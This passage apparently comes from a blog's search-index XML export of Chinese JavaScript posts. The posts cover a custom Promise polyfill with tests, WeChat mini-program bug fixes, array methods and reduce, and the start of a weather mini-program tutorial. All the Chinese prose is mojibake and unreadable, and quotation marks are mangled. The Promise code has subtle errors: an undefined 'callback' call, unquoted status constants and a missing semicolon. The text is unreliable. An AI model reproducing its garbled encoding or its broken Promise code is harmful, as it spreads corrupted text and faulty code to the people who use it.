éƒ½å·²ç»è¿è¡Œå®Œæˆï¼Œæ‰§è¡Œresolveå‡½æ•° if( â€“count == 0){ resolve(result) } } // ä¾æ¬¡å¾ªçŽ¯æ‰§è¡Œæ¯ä¸ªpromise for (; i &lt; len; i++) { // è‹¥æœ‰ä¸€ä¸ªå¤±è´¥ï¼Œå°±æ‰§è¡Œrejecterå‡½æ•° promises[i].then(resolver(i),rejecter); } });}å¤åˆ¶ä»£ç Promise.allä¼šè¿”å›žä¸€ä¸ª Promise å®žä¾‹ï¼Œè¯¥å®žä¾‹ç›´åˆ°å‚æ•°ä¸­çš„æ‰€æœ‰çš„ promise éƒ½æ‰§è¡ŒæˆåŠŸï¼Œæ‰ä¼šæ‰§è¡ŒæˆåŠŸå›žè°ƒï¼Œä¸€ä¸ªå¤±è´¥å°±ä¼šæ‰§è¡Œå¤±è´¥å›žè°ƒã€‚ æ—¥å¸¸å¼€å‘ä¸­ç»å¸¸ä¼šé‡åˆ°è¿™æ ·çš„éœ€æ±‚ï¼Œåœ¨ä¸åŒçš„æŽ¥å£è¯·æ±‚æ•°æ®ç„¶åŽæ‹¼åˆæˆè‡ªå·±æ‰€éœ€çš„æ•°æ®ï¼Œé€šå¸¸è¿™äº›æŽ¥å£ä¹‹é—´æ²¡æœ‰å…³è”ï¼ˆä¾‹å¦‚ä¸éœ€è¦å‰ä¸€ä¸ªæŽ¥å£çš„æ•°æ®ä½œä¸ºåŽä¸€ä¸ªæŽ¥å£çš„å‚æ•°ï¼‰ï¼Œè¿™ä¸ªæ—¶å€™ Promise.all æ–¹æ³•å°±å¯ä»¥æ´¾ä¸Šç”¨åœºäº†ã€‚ æ·»åŠ Promise.raceæ–¹æ³•è¯¥å‡½æ•°å’Œ Promise.all ç›¸ç±»ä¼¼ï¼Œå®ƒåŒæ ·æŽ¥æ”¶ä¸€ä¸ªæ•°ç»„ï¼Œä¸åŒçš„æ˜¯åªè¦è¯¥æ•°ç»„ä¸­çš„ä»»æ„ä¸€ä¸ª Promise å¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–ï¼ˆæ— è®ºæ˜¯ resolve è¿˜æ˜¯ rejectï¼‰è¯¥æ–¹æ³•éƒ½ä¼šè¿”å›žã€‚æˆ‘ä»¬åªéœ€è¦å¯¹ Promise.all æ–¹æ³•ç¨åŠ ä¿®æ”¹å°±å¯ä»¥äº†ã€‚ å¤åˆ¶ä»£ç Promise.race = function(promises){ if (!Array.isArray(promises)) { throw new TypeError(â€˜You must pass an array to race.â€™); } return Promise(function(resolve,reject){ var i = 0, len = promises.length; function resolver(value) { resolve(value); } function rejecter(reason){ reject(reason); } for (; i &lt; len; i++) { promises[i].then(resolver,rejecter); } }); }å¤åˆ¶ä»£ç ä»£ç ä¸­æ²¡æœ‰ç±»ä¼¼ä¸€ä¸ª resolveAll çš„å‡½æ•°ï¼Œå› ä¸ºæˆ‘ä»¬ä¸éœ€è¦ç­‰å¾…æ‰€æœ‰çš„ promise å¯¹è±¡çŠ¶æ€éƒ½å‘ç”Ÿå˜åŒ–ï¼Œåªè¦ä¸€ä¸ªå°±å¯ä»¥äº†ã€‚ æ·»åŠ å…¶ä»–APIä»¥åŠå°è£…å‡½æ•°åˆ°è¿™é‡Œï¼ŒPromise çš„ä¸»è¦APIéƒ½å·²ç»å®Œæˆäº†ï¼Œå¦å¤–æˆ‘ä»¬åœ¨æ·»åŠ ä¸€äº›æ¯”è¾ƒå¸¸è§çš„æ–¹æ³•ã€‚ä¹Ÿå¯¹ä¸€äº›å¯èƒ½å‡ºçŽ°çš„é”™è¯¯è¿›è¡Œäº†å¤„ç†ï¼Œæœ€åŽå¯¹å…¶è¿›è¡Œå°è£…ã€‚ å®Œæ•´çš„ä»£ç å¦‚ä¸‹ï¼š å¤åˆ¶ä»£ç (function(window,undefined){ // resolve å’Œ reject æœ€ç»ˆéƒ½ä¼šè°ƒç”¨è¯¥å‡½æ•°var final = function(status,value){ var promise = this, fn, st; if(promise._status !== &apos;PENDING&apos;) return; // æ‰€ä»¥çš„æ‰§è¡Œéƒ½æ˜¯å¼‚æ­¥è°ƒç”¨ï¼Œä¿è¯thenæ˜¯å…ˆæ‰§è¡Œçš„ setTimeout(function(){ promise._status = status; st = promise._status === &apos;FULFILLED&apos; queue = promise[st ? &apos;_resolves&apos; : &apos;_rejects&apos;]; while(fn = queue.shift()) { value = fn.call(promise, value) || value; } promise[st ? &apos;_value&apos; : &apos;_reason&apos;] = value; promise[&apos;_resolves&apos;] = promise[&apos;_rejects&apos;] = undefined; }); } //å‚æ•°æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå†…éƒ¨æä¾›ä¸¤ä¸ªå‡½æ•°ä½œä¸ºè¯¥å‡½æ•°çš„å‚æ•°,åˆ†åˆ«æ˜¯resolve å’Œ rejectvar Promise = function(resolver){ if (!(typeof resolver === â€˜functionâ€™ )) throw new TypeError(â€˜You must pass a resolver function as the first argument to the promise constructorâ€™); //å¦‚æžœä¸æ˜¯promiseå®žä¾‹ï¼Œå°±newä¸€ä¸ª if(!(this instanceof Promise)) return new Promise(resolver); var promise = this; promise._value; promise._reason; promise._status = &apos;PENDING&apos;; //å­˜å‚¨çŠ¶æ€ promise._resolves = []; promise._rejects = []; // var resolve = function(value) { //ç”±æ–¼applyåƒæ•¸æ˜¯æ•¸çµ„ final.apply(promise,[&apos;FULFILLED&apos;].concat([value])); } var reject = function(reason){ final.apply(promise,[&apos;REJECTED&apos;].concat([reason])); } resolver(resolve,reject); } Promise.prototype.then = function(onFulfilled,onRejected){ var promise = this; // æ¯æ¬¡è¿”å›žä¸€ä¸ªpromiseï¼Œä¿è¯æ˜¯å¯thenableçš„ return new Promise(function(resolve,reject){ function handle(value) { // é€™ä¸€æ­¥å¾ˆé—œéµï¼Œåªæœ‰é€™æ¨£æ‰å¯ä»¥å°‡å€¼å‚³éžçµ¦ä¸‹ä¸€å€‹resolve var ret = typeof onFulfilled === &apos;function&apos; &amp;&amp; onFulfilled(value) || value; //åˆ¤æ–­æ˜¯ä¸æ˜¯promise å¯¹è±¡ if (ret &amp;&amp; typeof ret [&apos;then&apos;] == &apos;function&apos;) { ret.then(function(value) { resolve(value); }, function(reason) { reject(reason); }); } else { resolve(ret); } } function errback(reason){ reason = typeof onRejected === &apos;function&apos; &amp;&amp; onRejected(reason) || reason; reject(reason); } if(promise._status === &apos;PENDING&apos;){ promise._resolves.push(handle); promise._rejects.push(errback); }else if(promise._status === FULFILLED){ // çŠ¶æ€æ”¹å˜åŽçš„thenæ“ä½œï¼Œç«‹åˆ»æ‰§è¡Œ callback(promise._value); }else if(promise._status === REJECTED){ errback(promise._reason); } }); } Promise.prototype.catch = function(onRejected){ return this.then(undefined, onRejected)} Promise.prototype.delay = function(ms,value){ return this.then(function(ori){ return Promise.delay(ms,value || ori); })} Promise.delay = function(ms,value){ return new Promise(function(resolve,reject){ setTimeout(function(){ resolve(value); console.log(â€˜1â€™); },ms); })} Promise.resolve = function(arg){ return new Promise(function(resolve,reject){ resolve(arg) })} Promise.reject = function(arg){ return Promise(function(resolve,reject){ reject(arg) })} Promise.all = function(promises){ if (!Array.isArray(promises)) { throw new TypeError(â€˜You must pass an array to all.â€™); } return Promise(function(resolve,reject){ var i = 0, result = [], len = promises.length, count = len //è¿™é‡Œä¸Žraceä¸­çš„å‡½æ•°ç›¸æ¯”ï¼Œå¤šäº†ä¸€å±‚åµŒå¥—ï¼Œè¦ä¼ å…¥index function resolver(index) { return function(value) { resolveAll(index, value); }; } function rejecter(reason){ reject(reason); } function resolveAll(index,value){ result[index] = value; if( --count == 0){ resolve(result) } } for (; i &lt; len; i++) { promises[i].then(resolver(i),rejecter); } }); } Promise.race = function(promises){ if (!Array.isArray(promises)) { throw new TypeError(â€˜You must pass an array to race.â€™); } return Promise(function(resolve,reject){ var i = 0, len = promises.length; function resolver(value) { resolve(value); } function rejecter(reason){ reject(reason); } for (; i &lt; len; i++) { promises[i].then(resolver,rejecter); } }); } window.Promise = Promise; })(window);å¤åˆ¶ä»£ç  ä¸‹è½½å®Œæ•´ç‰ˆä»£ç ï¼Œç‚¹å‡» github ï¼Œå¦‚æžœè§‰å¾—å¥½çš„è¯ï¼Œæ¬¢è¿Žstarã€‚ ä»£ç å†™å®Œäº†ï¼Œæ€»è¦å†™å‡ ä¸ªå®žä¾‹çœ‹çœ‹æ•ˆæžœå•Šï¼Œå…·ä½“çœ‹ä¸‹é¢çš„æµ‹è¯•ä»£ç ï¼š å¤åˆ¶ä»£ç var getData100 = function(){ return new Promise(function(resolve,reject){ setTimeout(function(){ resolve(â€˜100msâ€™); },1000); });} var getData200 = function(){ return new Promise(function(resolve,reject){ setTimeout(function(){ resolve(â€˜200msâ€™); },2000); });}var getData300 = function(){ return new Promise(function(resolve,reject){ setTimeout(function(){ reject(â€˜rejectâ€™); },3000); });} getData100().then(function(data){ console.log(data); // 100ms return getData200();}).then(function(data){ console.log(data); // 200ms return getData300();}).then(function(data){ console.log(data);}, function(data){ console.log(data); // â€˜rejectâ€™}); Promise.all([getData100(), getData200()]).then(function(data){ console.log(data); // [ â€œ100msâ€, â€œ200msâ€ ]}); Promise.race([getData100(), getData200(), getData300()]).then(function(data){ console.log(data); // 100ms});Promise.resolve(â€˜resolveâ€™).then(function(data){ console.log(data); //â€˜resolveâ€™})Promise.reject(â€˜rejectå‡½æ•°â€™).then(function(data){ console.log(data);}, function(data){ console.log(data); //â€˜rejectå‡½æ•°â€™})å¤åˆ¶ä»£ç ]]></content>
      <categories>
        <category>ES6</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å°ç¨‹åºbugé›†åˆ]]></title>
    <url>%2F2019%2F01%2F18%2Fminiprogram-bug%2F</url>
    <content type="text"><![CDATA[æœ¬åœ°ç›®å½•ä¸‹çš„èƒŒæ™¯å›¾åŠ è½½ä¸å‡ºæ¥ ä½¿ç”¨çº¿ä¸Šå›¾ç‰‡é“¾æŽ¥ï¼Œæˆ–è€…åŽ‹ç¼©æˆbase64ï¼Œå¸¸ç”¨åšæ³•å¯ä»¥ç”¨äº‘å­˜å‚¨åŠŸèƒ½ åŒºåŸŸæ»šåŠ¨ï¼Œ&lt;view&gt; åŠ æ»šåŠ¨å±žæ€§ overflow: auto; åœ¨çœŸæœºä¸Šæ»‘åŠ¨å¡é¡¿ åŒºåŸŸæ»šåŠ¨ä½¿ç”¨ &lt;scroll-view&gt; ç»„ä»¶ &lt;scroll-view&gt; åˆ†é¡µåŠ è½½ï¼Œä¸Šæ‹‰æ»šåŠ¨åˆ°åº•éƒ¨ï¼Œæ²¡æœ‰è§¦å‘scrolltolower äº‹ä»¶ éœ€è¦è®¾ç½® &lt;scroll-view&gt; çš„ height å±žæ€§ å°ç¨‹åºåº•éƒ¨ tabBar å›¾æ ‡æ¨¡ç³Š icon å¤§å°é™åˆ¶ä¸º 40kbï¼Œå»ºè®®å°ºå¯¸ä¸º 81px * 81px WXML ä¸­æ•°æ®ç»‘å®š Mustache è¯­æ³•ï¼ˆåŒæ‹¬å·ï¼‰ä¸å¯æ‰§è¡Œå‡½æ•° åŒæ‹¬å·å†…ä¸èƒ½æ‰§è¡Œä»»ä½•æ–¹æ³•ï¼Œåªèƒ½åšç®€å•çš„è¯•ç€è¿ç®—å’Œ Boolen åˆ¤æ–­ï¼Œä¹Ÿå¯ä»¥ç”¨ wxs å¤„ç†ï¼Œæ¯”å¦‚ { {m.parse(item)} } wx.navigateBack() æ— æ³•å‘å›žé€€é¡µé¢ä¼ å‚ å°ç¨‹åºçš„å‡ ä¸ªå¯¼èˆª api éƒ½å¯ä»¥é€šè¿‡ url ç»™å¯¹åº”é¡µé¢ä¼ å‚ã€‚è€Œ wx.navigateBack(delta) åªæŽ¥å—ä¸€ä¸ª delta å‚æ•°ï¼Œä½†æ˜¯æœ‰æ—¶å€™ç¡®å®žæœ‰å‘å›žé€€é¡µé¢ä¼ å‚ï¼Œè¿™æ—¶å€™åªèƒ½é€šè¿‡ localstorage æˆ– redux æ¥å¤„ç†ã€‚ ä¸èƒ½æ­£å¸¸åŠ è½½å­—ä½“æ–‡ä»¶ åŸºç¡€åº“ 2.1.0 å¼€å§‹æ”¯æŒï¼Œå­—ä½“é“¾æŽ¥å¿…é¡»æ˜¯åŒæºä¸‹çš„ï¼Œæˆ–å¼€å¯äº† cors æ”¯æŒï¼Œå°ç¨‹åºçš„åŸŸåæ˜¯ servicewechat.com åœ¨çœŸæœºä¸Šï¼ŒCanvas ç»„ä»¶ä¸éš &lt;scroll-view&gt; ä¸€èµ·æ»šåŠ¨ Canvas æ¸²æŸ“å®ŒæˆåŽï¼Œwx.canvasToTempFilePath èŽ·å–åœ°å€ç”Ÿæˆå›¾ç‰‡ï¼Œç”¨å›¾ç‰‡ä»£æ›¿ã€‚æˆ–è€…åœ¨ &lt;scroll-view&gt; æ»šåŠ¨æ—¶è§¦å‘ bindscroll äº‹ä»¶åŒæ­¥è°ƒæ•´ Canvas ä½ç½®è·Ÿéšæ»šåŠ¨ã€‚ ä¸ºä»€ä¹ˆ map ç»„ä»¶æ€»æ˜¯åœ¨æœ€ä¸Šå±‚ mapã€canvasã€videoã€textarea æ˜¯ç”±å®¢æˆ·ç«¯åˆ›å»ºçš„åŽŸç”Ÿç»„ä»¶ï¼ŒåŽŸç”Ÿç»„ä»¶çš„å±‚çº§æ˜¯æœ€é«˜çš„ï¼Œæ‰€ä»¥é¡µé¢ä¸­çš„å…¶ä»–ç»„ä»¶æ— è®ºè®¾ç½® z-index ä¸ºå¤šå°‘ï¼Œéƒ½æ— æ³•ç›–åœ¨åŽŸç”Ÿç»„ä»¶ä¸Šã€‚ åŽŸç”Ÿç»„ä»¶æš‚æ—¶è¿˜æ— æ³•æ”¾åœ¨ scroll-view ä¸Šï¼Œä¹Ÿæ— æ³•å¯¹åŽŸç”Ÿç»„ä»¶è®¾ç½® css åŠ¨ç”»ã€‚]]></content>
      <categories>
        <category>å°ç¨‹åº</category>
      </categories>
      <tags>
        <tag>å°ç¨‹åº</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç®€çº¦å¼ºå¤§æ•°ç»„æ“ä½œç»„åˆ]]></title>
    <url>%2F2018%2F12%2F25%2Farray-combination%2F</url>
    <content type="text"><![CDATA[å‰è¨€åœ¨å®žé™…jså¼€å‘ä¸­å¯¹æ•°ç»„æ“ä½œé¢‘çŽ‡éžå¸¸é«˜ï¼Œçœ‹è¿‡ä¸€äº›å°ä¼™ä¼´çš„ä¸€äº›ç”¨æ³•ï¼ŒæŒºæœ‰æ„æ€ï¼Œåœ¨è¿™é‡Œå°è®°ï¼ˆä¸å…¨ï¼‰ä¸€ä¸‹ï¼Œå¤‡å¿˜ã€‚ 5ä¸ªè¿­ä»£æ–¹æ³•ï¼ševeryã€filterã€forEachã€mapå’Œsome every()ï¼šå¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œå¦‚æžœè¯¥å‡½æ•°æ¯ä¸€é¡¹éƒ½è¿”å›žtrueï¼Œåˆ™è¿”å›žtrueï¼› filter()ï¼šå¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œè¿”å›žè¯¥å‡½æ•°ä¼šè¿”å›žtrueçš„é¡¹ç»„æˆçš„æ•°ç»„ï¼› forEach()ï¼šå¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œè¿™ä¸ªæ–¹æ³•æ²¡æœ‰è¿”å›žå€¼ï¼› map()ï¼šå¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œè¿”å›žæ¯æ¬¡å‡½æ•°è°ƒç”¨çš„ç»“æžœç»„æˆçš„æ•°ç»„ï¼› some()ï¼šå¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œå¦‚æžœè¯¥å‡½æ•°ä»»æ„ä¸€é¡¹è¿”å›žtrueï¼Œåˆ™è¿”å›žtrueï¼› 123456789101112131415161718192021222324// everyvar numbers = [1, 2, 3, 4, 5, 6, 7];var everyResult = numbers.every(function (item, index, array) &#123; return (item &gt; 2);&#125;);console.log(everyResult); // false// somesomeResult = numbers.some(function (item, index, array) &#123; return (item &gt; 2);&#125;);console.log(someResult); // true// filtervar filterResult = numbers.filter(function (item, index, array) &#123; return (item &gt; 2);&#125;);console.log(filterResult); // [3, 4, 5, 6, 7]// mapvar mapResult = numbers.map(function (item, index, array) &#123; return item * 2;&#125;);console.log(mapResult); // [2, 4, 6, 8, 10, 12, 14] ä¸€ä¸ªå½’å¹¶æ–¹æ³•ï¼šreducearray.reduce(callback[, initialValue])ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¯ä¸€é¡¹ä¸Šè°ƒç”¨çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°æœ‰å››ä¸ªå‚æ•°ï¼š accumulatorï¼šç´¯åŠ å›žè°ƒè¿”å›žå€¼ï¼›ä»–æ˜¯ä¸Šä¸€æ¬¡è°ƒç”¨æ—¶è¿”å›žçš„ç´¯ç§¯å€¼ï¼Œæˆ–initValueï¼› currentValueï¼šæ•°ç»„ä¸­æ­£åœ¨å¤„ç†çš„å…ƒç´ ï¼› currentIndexï¼šæ•°ç»„ä¸­æ­£åœ¨å¤„ç†çš„å½“å‰å…ƒç´ çš„ç´¢å¼•ã€‚å¦‚æžœæä¾›äº†initialValueï¼Œè¿™ç´¢å¼•å·ä¸º0ï¼Œå¦åˆ™ç´¢å¼•ä¸º1ï¼› arrayï¼šè°ƒç”¨reduce()çš„æ•°ç»„ã€‚ å½“ç¬¬äºŒä¸ªå‚æ•°çœç•¥æ—¶ï¼ŒéåŽ†ä»Žæ•°ç»„ç¬¬äºŒé¡¹å¼€å§‹ï¼Œæ•°ç»„ç¬¬ä¸€é¡¹è¢«å½“ä½œå‰ä¸€ä¸ªå€¼accumulatorã€‚ æ•°ç»„æ±‚å’Œ 12345const numbers = [10, 20, 30, 40];numbers.reduce((acc, cur, index, arr) =&gt; &#123; console.log('acc: ' + acc + '; ' + 'cur: ' + cur + ';'); return acc + cur;&#125;) ç»“æžœä¸ºï¼š 123acc: 10; cur: 20;acc: 30; cur: 30;acc: 60; cur: 40; è¿™ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯è®¾ç½®accumulatorçš„åˆå§‹ç±»åž‹å’Œåˆå§‹å€¼ï¼Œæ¯”å¦‚ä¸º0ï¼Œå°±è¡¨ç¤ºaccumulatorçš„åˆå§‹å€¼ä¸ºNumberç±»åž‹ï¼Œå€¼ä¸º0ï¼Œå› æ­¤ï¼Œreduceçš„æœ€ç»ˆç»“æžœä¹Ÿä¼šæ˜¯Numberç±»åž‹ã€‚ 12345const numbers = [10, 20, 30, 40];numbers.reduce((acc, cur, index, arr) =&gt; &#123; console.log('acc: ' + acc + '; ' + 'cur: ' + cur + ';'); return acc + cur;&#125;, 0) ç»“æžœä¸ºï¼š 1234acc: 0; cur: 10;acc: 10; cur: 20;acc: 30; cur: 30;acc: 60; cur: 40; å¼ºå¤§çš„reducereduceä½œä¸ºå½’å¹¶æ–¹æ³•ï¼Œåœ¨æœ‰äº›æƒ…å½¢å¯ä»¥æ›¿ä»£å…¶å®ƒæ•°ç»„æ“ä½œæ–¹æ³•ï¼Œå¼ºå¤§ä¹‹å¤„ï¼Œè¿˜å¾—è¦è½å®žåœ¨å…·ä½“çš„æ¡ˆä¾‹ä¸Šã€‚ å‡è®¾çŽ°åœ¨æœ‰ä¸€ä¸ªæ•°åˆ—[10, 20, 30, 40, 50]ï¼Œæ¯ä¸€é¡¹ä¹˜ä»¥2ï¼Œç„¶åŽç­›é€‰å‡ºå¤§äºŽ60çš„é¡¹ã€‚ åœ¨è¿™é‡Œæ›´æ–°æ•°ç»„æ¯ä¸€é¡¹ï¼ˆmapçš„åŠŸèƒ½ï¼‰ç„¶åŽç­›é€‰å‡ºä¸€éƒ¨åˆ†ï¼ˆfilterçš„åŠŸèƒ½ï¼‰ï¼Œå¦‚æžœæ˜¯å…ˆä½¿ç”¨mapç„¶åŽfilterçš„è¯ï¼Œä½ éœ€è¦éåŽ†è¿™ä¸ªæ•°ç»„ä¸¤æ¬¡ã€‚åœ¨è¿™é‡Œç”¨reduceæ›´é«˜æ•ˆã€‚ 123456789var numbers = [10, 20, 30, 40, 50];var result = numbers.reduce(function (acc, cur) &#123; cur = cur * 2; if (cur &gt; 60) &#123; acc.push(cur); &#125; return acc;&#125;, []);console.log(result); // [80, 100] ä»Žè¿™ä¸ªä¾‹å­å¯ä»¥çœ‹å‡ºreduceå®Œæˆäº†mapå’Œfilterçš„ä½¿å‘½ã€‚ ç»Ÿè®¡æ•°ç»„ä¸­é‡å¤å‡ºçŽ°é¡¹çš„ä¸ªæ•°ï¼Œç”¨å¯¹è±¡è¡¨ç¤ºã€‚ 123456var letters = ['A', 'B', 'C', 'C', 'B', 'C', 'C'];var letterObj = letters.reduce(function (acc, cur) &#123; acc[cur] = acc[cur] ? ++acc[cur] : 1; return acc;&#125;, &#123;&#125;);console.log(letterObj); // &#123;A: 1, B: 2, C: 4&#125; æ•°ç»„åŽ»é‡ 12345678var letters = ['A', 'B', 'C', 'C', 'B', 'C', 'C'];var letterArr = letters.reduce(function (acc, cur) &#123; if (acc.indexOf(cur) === -1) &#123; acc.push(cur); &#125; return acc;&#125;, []);console.log(letterArr); // ["A", "B", "C"] psï¼šäº†è§£æ›´å¤šæ•°ç»„åŽ»é‡æ–¹æ³•ï¼Œç‚¹è¿™é‡Œã€‚ ä¸ŽES6çš„ç»“åˆä¸ŽES6ç»“åˆä½¿ç”¨ä¹Ÿä¼šæ“¦å‡ºä¸å°‘ç«èŠ±ã€‚ åˆ é™¤ç›®æ ‡å¯¹è±¡æŸä¸ªå±žæ€§ã€‚ 1234567891011121314151617const person = &#123; name: 'jazz', gender: 'male', age: 24&#125;;const personUnknowAge = Object.keys(person).filter((key) =&gt; &#123; return key !== 'age';&#125;).map((key) =&gt; &#123; return &#123; [key]: person[key] &#125;&#125;).reduce((acc, cur) =&gt; &#123; return &#123;...acc, ...cur&#125;;&#125;, &#123;&#125;);console.log(personUnknowAge); // &#123;name: "jazz", gender: "male"&#125; æ›´ç®€æ´çš„æ–¹æ¡ˆï¼Œåˆ©ç”¨ES6ä¸­å‡½æ•°å‚æ•°è§£æž„ï¼š 12const personUnknowAge = ((&#123;name, gender&#125;) =&gt; (&#123;name, gender&#125;))(person);console.log(personUnknowAge); // &#123;name: "jazz", gender: "male"&#125; å½“ç„¶è¿˜æœ‰æ›´ç®€å•çš„æ–¹æ¡ˆï¼Œåˆ©ç”¨ES6ä¸­å¯¹è±¡è§£æž„ï¼š 1234567const person = &#123; name: 'jazz', gender: 'male', age: 24&#125;;let &#123; age, ...personUnknowAge &#125; = person;console.log(personUnknowAge); // &#123;name: "jazz", gender: "male"&#125; ç»“å°¾æ•°ç»„æ“ä½œçš„â€œå¦™ç”¨â€è¿œä¸æ­¢è¿™äº›ï¼ŒåŽé¢æœ‰ç©ºå†ç ”ç©¶è¡¥å……å§ï¼Œå®Œ~]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä»Žå…¥é—¨åˆ°ä¸Šçº¿ä¸€ä¸ªå¤©æ°”å°ç¨‹åº]]></title>
    <url>%2F2018%2F10%2F31%2Fminiprogram-abc%2F</url>
    <content type="text"><![CDATA[å‰è¨€å­¦ä¹ äº†ä¸€æ®µæ—¶é—´å°ç¨‹åºï¼Œå¤§è‡´è¿‡äº†ä¸¤éå¼€å‘æ–‡æ¡£ï¼ŒæŠ½ç©ºåšä¸ªè‡ªå·±çš„å¤©æ°”é¢„æŠ¥å°ç¨‹åºï¼Œå…¨å½“æ˜¯ç»ƒæ‰‹ï¼Œåœ¨è¿™è®°å½•ä¸‹ã€‚å°ç¨‹åºå¼€å‘çš„å®‰è£…ã€æ³¨å†Œå’ŒæŽ¥å…¥ç­‰æµç¨‹å°±ä¸ç½—åˆ—äº†ï¼Œåœ¨å°ç¨‹åºæŽ¥å…¥æŒ‡å—å·²ç»å†™å¾—å¾ˆæ¸…æ¥šäº†ï¼Œä»¥ä¸‹åªå¯¹å¼€å‘è¿‡ç¨‹å¸¸ç”¨åˆ°å¾—ä¸€äº›æ¦‚å¿µè¿›è¡Œç®€å•æ¢³ç†ï¼Œç±»æ¯” Vue åŠ å¼ºè®°å¿†ï¼Œæœ€åŽé€‰å–ä¸ªäººé¡¹ç›®å¤©æ°”å°ç¨‹åºä¸­è¦æ³¨æ„çš„å‡ ç‚¹æ¥è¯´æ˜Žã€‚ æ¬¢è¿Žæ‰«ç ä½“éªŒ æºç è¯·æˆ³è¿™é‡Œï¼Œæ¬¢è¿Žstart~ åˆå§‹åŒ–é¡¹ç›®ç›®å½•ç»“æž„å®‰è£…å¥½å¼€å‘è€…å·¥å…·ï¼Œå¡«å¥½ç”³è¯·åˆ°çš„AppIDï¼Œé€‰å¥½é¡¹ç›®ç›®å½•ï¼Œåˆå§‹åŒ–ä¸€ä¸ªæ™®é€šå°ç¨‹åºç›®å½•ç»“æž„ï¼Œå¾—åˆ°ï¼š 1234567891011121314151617--|-- pages |-- index |-- index.js // é¦–é¡µjsæ–‡ä»¶ |-- index.json // é¦–é¡µjsonæ–‡ä»¶ |-- index.wxml // é¦–é¡µwxmlæ–‡ä»¶ |-- index.wxss // é¦–é¡µwxssæ–‡ä»¶ |-- logs |-- logs.js // æ—¥å¿—é¡µjsæ–‡ä»¶ |-- logs.json // æ—¥å¿—é¡µjsonæ–‡ä»¶ |-- logs.wxml // æ—¥å¿—é¡µwxmlæ–‡ä»¶ |-- logs.wxss // æ—¥å¿—é¡µwxssæ–‡ä»¶ |-- utils |-- util.js // å°ç¨‹åºå…¬ç”¨æ–¹æ³• |-- app.js // å°ç¨‹åºé€»è¾‘ |-- app.json // å°ç¨‹åºå…¬å…±é…ç½® |-- app.wxss // å°ç¨‹åºå…¬å…±æ ·å¼è¡¨ |-- project.config.json // å°ç¨‹åºé¡¹ç›®é…ç½® å¯ä»¥çœ‹åˆ°ï¼Œé¡¹ç›®æ–‡ä»¶ä¸»è¦åˆ†ä¸º.jsonã€.wxmlï¼Œ.wxsså’Œ.jsç±»åž‹ï¼Œæ¯ä¸€ä¸ªé¡µé¢ç”±å››ä¸ªæ–‡ä»¶ç»„æˆï¼Œä¸ºäº†æ–¹ä¾¿å¼€å‘è€…å‡å°‘é…ç½®ï¼Œæè¿°é¡µé¢çš„å››ä¸ªæ–‡ä»¶å¿…é¡»å…·æœ‰ç›¸åŒçš„è·¯å¾„ä¸Žæ–‡ä»¶åã€‚ JSONé…ç½®å°ç¨‹åºé…ç½® app.jsonapp.jsoné…ç½®æ˜¯å½“å‰å°ç¨‹åºçš„å…¨å±€é…ç½®ï¼ŒåŒ…æ‹¬å°ç¨‹åºçš„æ‰€æœ‰é¡µé¢è·¯å¾„ã€ç•Œé¢è¡¨çŽ°ã€ç½‘ç»œè¶…æ—¶æ—¶é—´ã€åº•éƒ¨ tab ç­‰ã€‚ å·¥å…·é…ç½® project.config.jsonå·¥å…·é…ç½®åœ¨å°ç¨‹åºçš„æ ¹ç›®å½•ï¼Œå¯¹å·¥å…·åšçš„ä»»ä½•é…ç½®éƒ½ä¼šå†™å…¥è¿™ä¸ªæ–‡ä»¶ï¼Œä½¿å¾—åªè¦è½½å…¥åŒä¸€ä¸ªé¡¹ç›®ä»£ç åŒ…ï¼Œå¼€å‘åˆ™å·¥å…·ä¼šè‡ªåŠ¨æ¢å¤å½“æ—¶ä½ å¼€å‘é¡¹ç›®æ—¶çš„ä¸ªæ€§è®¾ç½®ã€‚ é¡µé¢é…ç½® page.jsoné¡µé¢é…ç½® æ˜¯å°ç¨‹åºé¡µé¢ç›¸å…³çš„é…ç½®ï¼Œè®©å¼€å‘è€…å¯ä»¥ç‹¬ç«‹å®šä¹‰æ¯ä¸ªé¡µé¢çš„ä¸€äº›å±žæ€§ï¼Œæ¯”å¦‚é¡¶éƒ¨é¢œè‰²ï¼Œæ˜¯å¦ä¸‹æ‹‰ç­‰ã€‚ WXML æ¨¡æ¿WXML å……å½“ç±»ä¼¼ HTML çš„è§’è‰²ï¼Œæœ‰æ ‡ç­¾ï¼Œæœ‰å±žæ€§ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰äº›åŒºåˆ«ï¼š æ ‡ç­¾åä¸ä¸€æ ·ã€‚å†™ HTML å¸¸ç”¨æ ‡ç­¾ &lt;div&gt;ï¼Œ&lt;p&gt;ï¼Œ&lt;span&gt;ç­‰ï¼Œè€Œå°ç¨‹åºä¸­æ ‡ç­¾æ›´åƒæ˜¯å°è£…å¥½çš„ç»„ä»¶ï¼Œæ¯”å¦‚&lt;scroll-view&gt;, &lt;swiper&gt;, &lt;map&gt;ï¼Œæä¾›ç›¸åº”çš„åŸºç¡€èƒ½åŠ›ç»™å¼€å‘è€…ä½¿ç”¨ã€‚ æä¾› wx:ifï¼Œ&#123;&#123;&#125;&#125;ç­‰æ¨¡æ¿è¯­æ³•ã€‚å°ç¨‹åºå°†æ¸²æŸ“å’Œé€»è¾‘åˆ†ç¦»ï¼Œç±»ä¼¼äºŽReactï¼ŒVueçš„MVVMå¼€å‘æ¨¡å¼ï¼Œè€Œä¸æ˜¯è®© JS æ“ä½œ DOMã€‚ 